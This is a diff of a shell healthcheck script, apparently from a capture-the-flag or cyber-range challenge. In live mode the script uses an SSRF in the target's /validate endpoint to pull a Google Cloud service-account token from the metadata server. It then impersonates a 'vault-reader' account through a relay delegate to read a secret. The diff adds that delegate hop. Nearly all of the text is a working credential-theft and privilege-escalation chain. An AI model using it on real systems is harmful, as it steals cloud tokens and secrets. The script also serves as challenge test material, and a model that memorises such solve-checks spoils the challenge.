@@ -12,10 +12,11 @@ if [ "${LIVE:-0}" = "1" ]; then
   T1="$(curl -fsS "$TARGET/validate?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
         | grep -oE 'ya29[._A-Za-z0-9-]+' | head -1)"
   [ -n "$T1" ] || { echo "h01 live: no runner token"; exit 1; }
-  # hop 1: runner -> relay, hop 2: relay -> vault-reader, then read secret
+  # two-hop chain: base(runner) -> delegate(ape-relay) -> target(vault-reader), then read
   FLAGV="$(CLOUDSDK_AUTH_ACCESS_TOKEN="$T1" gcloud secrets versions access latest \
     --secret=ape-ride-crownjewels --project "$PROJ" \
-    --impersonate-service-account="vault-reader@${PROJ}.iam.gserviceaccount.com" 2>/dev/null || true)"
+    --impersonate-service-account="vault-reader@${PROJ}.iam.gserviceaccount.com" \
+    --delegates="ape-relay@${PROJ}.iam.gserviceaccount.com" 2>/dev/null || true)"
   echo "$FLAGV" | grep -qE "${FLAG_PREFIX}\{" && { echo "h01 healthcheck rc=0 (live)"; exit 0; }
   echo "h01 healthcheck FAILED (live)"; exit 1
 fi
